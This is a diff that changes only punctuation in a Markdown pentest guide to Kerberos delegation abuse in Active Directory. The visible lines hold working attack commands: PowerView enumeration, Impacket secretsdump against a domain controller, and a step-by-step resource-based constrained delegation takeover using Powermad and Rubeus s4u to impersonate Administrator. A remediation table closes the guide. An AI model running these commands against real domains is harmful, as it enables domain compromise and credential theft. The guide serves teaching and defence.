@@ -4,7 +4,7 @@
 
 Delegation lets a service act on behalf of a user when accessing other services. Think: you log into a web app, the web app needs to query a database as you. Delegation lets it do that.
 
-There are three types — each has a different attack.
+There are three types - each has a different attack.
 
 ---
 
@@ -14,13 +14,13 @@ There are three types — each has a different attack.
 
 A computer or service account with Unconstrained Delegation is trusted to forward **any** Kerberos ticket it receives to any service. When a user authenticates to it, the DC sends the user's full TGT along with the TGS. The machine stores these TGTs in memory.
 
-**If you compromise a machine with Unconstrained Delegation and a Domain Admin authenticates to it → you steal their TGT → you are Domain Admin.**
+**If you compromise a machine with Unconstrained Delegation and a Domain Admin authenticates to it -> you steal their TGT -> you are Domain Admin.**
 
 ### Finding It
 
 ```powershell
 # PowerView
-Get-DomainComputer -Unconstrained    # DCs are always unconstrained — look for non-DCs
+Get-DomainComputer -Unconstrained    # DCs are always unconstrained - look for non-DCs
 
 # BloodHound query
 # "Find Computers with Unconstrained Delegation"
@@ -82,7 +82,7 @@ Get-DomainUser -TrustedToAuth | Select name, msds-allowedtodelegateto
 dir \\dc01.corp.local\C$
 ```
 
-### Exploiting It (Impacket — From Kali)
+### Exploiting It (Impacket - From Kali)
 
 ```sh
 # Get TGT for the service account
@@ -103,29 +103,29 @@ secretsdump.py -k -no-pass dc01.corp.local
 
 Instead of the service account being configured to delegate, the **target machine** specifies who is allowed to delegate to it. Configured in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target computer object.
 
-**Attack:** If you have `GenericWrite` or `GenericAll` over a computer object, you can configure RBCD to allow a machine you control to impersonate any user to that target computer — including DA.
+**Attack:** If you have `GenericWrite` or `GenericAll` over a computer object, you can configure RBCD to allow a machine you control to impersonate any user to that target computer - including DA.
 
 ### Exploiting It
 
 ```powershell
-# Step 1 — You need a machine account you control (or create one)
-# Create a fake computer account (any domain user can by default — up to 10)
+# Step 1 - You need a machine account you control (or create one)
+# Create a fake computer account (any domain user can by default - up to 10)
 Import-Module Powermad.ps1
 New-MachineAccount -MachineAccount FakeComputer -Password (ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)
 
-# Step 2 — Get the SID of your fake computer
+# Step 2 - Get the SID of your fake computer
 Get-DomainComputer FakeComputer | Select objectsid
 
-# Step 3 — Configure RBCD on the target (you need GenericWrite on target computer)
+# Step 3 - Configure RBCD on the target (you need GenericWrite on target computer)
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<FakeComputer-SID>)"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 Get-DomainComputer <target> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 
-# Step 4 — Use s4u to get a ticket as Administrator to the target
+# Step 4 - Use s4u to get a ticket as Administrator to the target
 .\Rubeus.exe s4u /user:FakeComputer$ /rc4:<FakeComputer-NTLM> /impersonateuser:Administrator /msdsspn:"cifs/<target>.corp.local" /ptt
 
-# Step 5 — Access target
+# Step 5 - Access target
 dir \\target.corp.local\C$
 ```
 
@@ -147,9 +147,9 @@ dir \\target.corp.local\C$
 
 | Finding | Remediation |
 |---|---|
-| Unconstrained delegation on non-DC machines | Remove unconstrained delegation from all machines that are not Domain Controllers. In ADUC: Computer object → Properties → Delegation tab → change to "Do not trust this computer for delegation" or switch to constrained. |
+| Unconstrained delegation on non-DC machines | Remove unconstrained delegation from all machines that are not Domain Controllers. In ADUC: Computer object -> Properties -> Delegation tab -> change to "Do not trust this computer for delegation" or switch to constrained. |
 | Constrained delegation configured on user/computer | Audit all accounts with `msDS-AllowedToDelegateTo` set. If delegation is still needed, scope it to the minimum required SPN. Use gMSA instead of user accounts. |
-| Sensitive accounts authenticate to unconstrained machines | Add high-value accounts (DA, EA, krbtgt) to the **Protected Users** security group — forces Kerberos with no delegation allowed. |
+| Sensitive accounts authenticate to unconstrained machines | Add high-value accounts (DA, EA, krbtgt) to the **Protected Users** security group - forces Kerberos with no delegation allowed. |
 | Machine account quota allows RBCD setup | Lower `ms-DS-MachineAccountQuota` from default 10 to **0** for all regular users. |
 | GenericWrite on computer objects | Remove overpermissive ACEs on computer objects. |
 
